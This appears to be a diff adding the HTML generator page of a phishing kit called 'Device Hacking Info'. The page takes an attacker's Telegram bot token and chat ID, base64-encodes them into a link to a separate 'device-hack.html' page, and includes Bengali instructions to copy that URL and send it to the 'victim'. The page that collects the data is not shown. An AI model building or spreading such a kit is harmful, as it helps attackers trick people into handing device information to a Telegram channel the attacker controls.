@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device Hacking Info</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background: linear-gradient(135deg, #e0f7fa 0%, #80deea 100%);
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .container {
+            text-align: center;
+            background-color: #ffffff;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
+            max-width: 500px;
+            width: 100%;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+        .container:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+        }
+        .header {
+            font-size: 24px;
+            font-weight: bold;
+            padding: 15px 20px;
+            background-color: #ffeb3b;
+            color: #333;
+            border-radius: 12px 12px 0 0;
+            margin-bottom: 20px;
+            transition: background-color 0.3s ease;
+        }
+        .header:hover {
+            background-color: #ffd600;
+        }
+        input[type="text"] {
+            padding: 12px;
+            font-size: 16px;
+            width: 100%;
+            box-sizing: border-box;
+            margin-bottom: 20px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            background-color: #f9f9f9;
+            transition: border-color 0.3s ease, background-color 0.3s ease;
+        }
+        input[type="text"]:focus {
+            border-color: #80deea;
+            background-color: #e0f7fa;
+            outline: none;
+        }
+        button {
+            padding: 15px 30px;
+            font-size: 18px;
+            cursor: pointer;
+            background-color: #4caf50;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            transition: background-color 0.3s ease, transform 0.3s ease;
+        }
+        button:hover {
+            background-color: #388e3c;
+            transform: scale(1.05);
+        }
+        .note {
+            font-size: 14px;
+            color: #777;
+            margin-top: 20px;
+            transition: color 0.3s ease;
+        }
+        .note:hover {
+            color: #555;
+        }
+        .generated-link {
+            margin-top: 20px;
+            font-size: 18px;
+            word-break: break-all;
+            transition: color 0.3s ease;
+        }
+        .generated-link a {
+            color: #007bff;
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+        .generated-link a:hover {
+            color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">Device Hacking Info</div>
+        <input type="text" id="telegramToken" placeholder="Enter Telegram Token">
+        <input type="text" id="chatId" placeholder="Enter Chat ID">
+        <p style="font-family: 'Arial', sans-serif; color: #ff6708;">Note: এখানে Bot_token এবং chat_id ইনপুট করুন এবং জেনারেট এ ক্লিক করুন।</p>
+        <button onclick="generateLink()">Generate</button>
+        <div class="generated-link" id="generatedLink"></div>
+        <div class="note">Developed by Rnasaks</div>
+    </div>
+
+    <script>
+        function generateLink() {
+            const telegramToken = document.getElementById('telegramToken').value;
+            const chatId = document.getElementById('chatId').value;
+
+            if (!telegramToken || !chatId) {
+                alert('Please enter both Telegram Token and Chat ID.');
+                return;
+            }
+
+            const encodedParams = btoa(`token=${telegramToken}&chatId=${chatId}`);
+            const link = `device-hack.html?data=${encodedParams}`;
+
+            const generatedLinkElement = document.getElementById('generatedLink');
+            generatedLinkElement.innerHTML = `<a href="${link}" target="_blank">Device Hack Info</a><br> <span style="color: red;">লিংকে ক্লিক করুন এবং ইউআরএল কপি করে ভিকটিম কে দিয়ে দেন।</span>`;
+        }
+    </script>
+</body>
+</html>
